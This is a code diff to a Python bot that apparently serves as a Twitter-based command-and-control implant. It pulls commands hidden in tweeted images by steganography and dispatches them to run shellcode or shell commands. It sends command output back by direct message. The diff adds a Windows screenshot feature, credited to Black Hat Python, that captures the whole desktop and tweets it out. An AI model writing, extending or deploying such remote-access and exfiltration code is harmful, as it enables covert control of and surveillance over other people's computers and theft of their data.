@@ -4,6 +4,7 @@
 """pip3 install pyyaml"""
 
 import sys
+import os
 import yaml
 import twitter
 import urllib
@@ -15,6 +16,16 @@ import random
 import requests
 import subprocess
 from subprocess import check_output
+
+# Try to import windows specific modules
+try:
+    import win32gui
+    import win32ui
+    import win32con
+    import win32api
+    from PIL import Image
+except ImportError:
+    pass
 
 # Import YAML
 with open("conf.yaml", 'r') as stream:
@@ -57,7 +68,7 @@ def verify_api():
 
 def get_secret(image):
     # reveal hidden message in the image
-    clear_message = check_output(["python3", "reveal.py", "./download/" + image])
+    clear_message = check_output(["py", "reveal.py", "./download/" + image])
     print(clear_message)
     return clear_message
 
@@ -97,6 +108,37 @@ def run_bash_command(bash_command_str, to):
         print("Sending output: \n" + output + "\nto: " + to)
         api.PostDirectMessage(text=output, user_id=to)
 
+def run_take_screenshot(to):
+    print("Taking screenshot...")
+    # Taken from Black Hat Python book
+    hdesktop = win32gui.GetDesktopWindow()
+
+    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
+    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
+    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
+    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
+
+    desktop_dc = win32gui.GetWindowDC(hdesktop)
+    img_dc = win32ui.CreateDCFromHandle(desktop_dc)
+
+    mem_dc = img_dc.CreateCompatibleDC()
+
+    screenshot = win32ui.CreateBitmap()
+    screenshot.CreateCompatibleBitmap(img_dc, width, height)
+    mem_dc.SelectObject(screenshot)
+
+    mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
+
+    screenshot.SaveBitmapFile(mem_dc, "./output-imgs/screenshot.bmp")
+    img = Image.open("./output-imgs/screenshot.bmp")
+    img.save( "./output-imgs/screenshot.png", "png")
+
+    mem_dc.DeleteDC()
+    win32gui.DeleteObject(screenshot.GetHandle())
+
+    os.remove("./output-imgs/screenshot.bmp");
+    tweet_image("screenshot.png", "Smile!")
+
 def check_new_creds(yaml_conf):
     global api, conf
     conf = yaml.load(yaml_conf)
@@ -116,6 +158,8 @@ def meow_operation(operation_mode, operation_payload, sender):
         run_shellcode(operation_payload)
     elif (operation_mode == "BASH_COMMAND"):
         run_bash_command(operation_payload, sender)
+    elif (operation_mode == "TAKE_SCREENSHOT"):
+        run_take_screenshot(sender)
     elif (operation_mode == "NEW_CREDS"):
         check_new_creds(operation_payload)
 
@@ -155,6 +199,7 @@ def process_tweet(tweet):
         urllib.urlretrieve(tweet.media[0].media_url_https, "./download/cmd.png")
         print("Downloaded.")
         print("Decrypting hidden message...")
+        # try:
         payload = get_secret("cmd.png")
         payload_splitted = payload.split(":",1)
         if(len(payload_splitted) == 2):
@@ -163,6 +208,9 @@ def process_tweet(tweet):
             meow_operation(operation_mode, operation_payload, str(tweet.user.id))
         else:
             print("[ERROR] No protocol specified")
+        # except:
+        #     print("[ERROR] Decrypting hidden message.")
+        #     pass
 
 def extract_urls():
     return re.search("(?P<url>https?://[^\s]+)", myString).group("url")
